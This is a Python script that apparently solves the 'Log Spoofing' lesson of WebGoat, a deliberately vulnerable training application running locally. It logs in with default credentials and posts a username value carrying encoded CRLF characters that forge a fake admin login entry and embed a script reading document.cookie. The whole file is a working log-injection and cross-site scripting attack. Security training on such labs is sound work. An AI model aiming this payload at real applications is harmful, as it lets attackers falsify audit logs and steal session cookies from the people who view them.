"""
"""

import argparse
import re
import json
import sys
import requests

url1 = 'http://127.0.0.1:8080/WebGoat/login.mvc'
url2 = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'
url3 = 'http://127.0.0.1:8080/WebGoat/'

payload1 = {'username':'webgoat','password':'webgoat'}

session = requests.Session()
first = session.get(url1)
login = session.post(url2, data=payload1)

lessonMenu = session.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')
lessons = lessonMenu.text

parsed = json.loads(lessons)

for each in parsed:
    if 'Injection Flaws' in (each['name']):
	for e in each['children']:
	    if 'Log Spoofing' in e['name']:
		lessonLink = (e['link'])

payload2 = {'username':'Smith%250d%250aLogin+Succeeded+for+username%3A+admin%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E+&password=&SUBMIT=Login'}

log = session.post(url3+lessonLink, data=payload2)
if 'Login Succeeded' in log.text:
    print('Attack Successful')
else:
    print('Attack Failed')
